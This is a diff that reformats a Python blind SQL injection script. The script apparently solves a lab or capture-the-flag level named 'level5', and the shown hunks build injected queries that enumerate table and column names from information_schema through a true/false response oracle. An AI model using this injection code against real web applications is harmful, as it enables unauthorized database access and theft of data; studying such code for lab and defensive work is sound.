@@ -3,6 +3,7 @@
 Oracle: id=3 AND <cond> -> 500 TRUE / 404 FALSE. Everything URL-encoded.
 Uses MAX(table_name) iteration (no group_concat), LIMIT i,1 for rows.
 """
+
 import json
 import os
 import time
@@ -106,8 +107,10 @@ def q_tables(cache):
     names = cache["tables"]
     lower = "'~~'"
     while True:
-        expr = (f"(SELECT+MAX(table_name)+FROM+information_schema.tables+"
-                f"WHERE+table_schema='level5'+AND+table_name<{lower})")
+        expr = (
+            f"(SELECT+MAX(table_name)+FROM+information_schema.tables+"
+            f"WHERE+table_schema='level5'+AND+table_name<{lower})"
+        )
         name = extract(expr, 60, f"tbl_{len(names)}", cache)
         if not name:
             break
@@ -124,9 +127,11 @@ def q_columns(table, cache):
     cols = cache[f"cols_{table}"]
     guard = "'~~'"
     while True:
-        expr = (f"(SELECT MAX(column_name)+FROM+information_schema.columns+"
-                f"WHERE+table_schema='level5'+AND+table_name='{table}'+"
-                f"AND+column_name<{guard})")
+        expr = (
+            f"(SELECT MAX(column_name)+FROM+information_schema.columns+"
+            f"WHERE+table_schema='level5'+AND+table_name='{table}'+"
+            f"AND+column_name<{guard})"
+        )
         col = extract(expr, 80, f"col_{table}_{len(cols)}", cache)
         if not col:
             break
